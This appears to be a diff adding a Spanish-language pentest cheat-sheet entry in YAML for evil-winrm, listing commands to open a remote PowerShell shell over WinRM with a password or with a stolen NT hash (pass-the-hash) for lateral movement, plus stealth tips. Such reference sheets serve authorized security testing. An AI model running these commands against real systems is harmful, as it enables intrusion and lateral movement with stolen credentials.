@@ -1,0 +1,27 @@
+# Comandos de evil-winrm: shell de PowerShell sobre WinRM (5985/5986) con credenciales o hash.
+tool: evil-winrm
+area: ad
+url: https://github.com/Hackplayers/evil-winrm
+commands:
+  - id: evil-winrm-pass
+    title: Shell por WinRM con contraseña
+    cmd: |
+      evil-winrm -i {{RHOST}} -u {{USER}} -p '{{PASS}}'
+    phase: lateral
+    tags: [winrm, lateral-movement]
+    notes: >-
+      Da una shell estable de PowerShell, más cómoda que meterpreter cuando ya tienes credenciales.
+      El usuario tiene que estar en Remote Management Users (valídalo antes con 'nxc winrm': si sale
+      (Pwn3d!), entra). Dentro, 'upload'/'download' transfieren ficheros.
+    refs: [https://github.com/Hackplayers/evil-winrm]
+
+  - id: evil-winrm-hash
+    title: Shell por WinRM con Pass-the-Hash
+    cmd: |
+      evil-winrm -i {{RHOST}} -u Administrator -H {{HASH}}
+    phase: lateral
+    tags: [winrm, pass-the-hash]
+    notes: >-
+      -H usa el hash NT en vez de la contraseña: no hace falta crackearlo. Es la forma limpia de
+      moverse con un hash de la SAM o del NTDS, sin dejar el servicio ruidoso que planta psexec.
+    refs: [https://github.com/Hackplayers/evil-winrm]
